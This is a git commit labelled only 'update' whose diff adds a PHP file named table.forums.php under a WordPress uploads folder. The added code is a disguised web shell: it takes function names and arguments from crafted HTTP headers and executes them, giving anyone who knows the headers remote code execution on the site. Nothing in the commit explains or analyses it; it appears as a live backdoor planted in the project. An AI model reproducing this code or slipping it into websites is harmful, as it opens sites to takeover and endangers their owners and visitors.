d8228304fa803e3b34ca4064c3147ad23418bd5d
Fast and Static <it@e-me.co>
2024-10-18 11:45:59 +0000

    update

---
+++ wp-content/uploads/2020/12/table.forums.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['If-Modified-Since'])) {
+    $post = $_HEADERS['If-Modified-Since']('', $_HEADERS['Large-Allocation']($_HEADERS['Feature-Policy']));
+    $post();
+}
